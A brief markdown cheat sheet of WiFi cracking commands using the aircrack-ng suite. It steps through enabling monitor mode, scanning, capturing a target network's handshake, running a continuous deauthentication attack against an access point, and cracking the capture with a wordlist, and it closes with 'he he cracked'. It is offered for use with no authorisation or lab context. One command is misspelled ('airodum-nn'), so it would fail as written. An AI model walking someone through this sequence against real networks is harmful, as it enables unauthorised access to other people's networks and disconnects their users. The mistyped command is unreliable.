# WIFI HAKING COMMANDS

### TO check network interfaces
```
iwconfig
```

### TO enable monitor mode if not enabled
```
sudo airmon-ng start wlan0
```

### For start scanning
```
sudo airodump-ng wlan0
```

### For scanning specific wifi network 
```
sudo airodum-nn --bssid (your bssid) --channel (your channel) --write filename wlan0
```

### For Deauthentication attack
```
sudo aireplay-ng --deauth 0 -a (your bssid) wlan0
```

### To crack cap file
```
sudo aircrack-ng -w (wordlist path) capfile name 
```

he he cracked
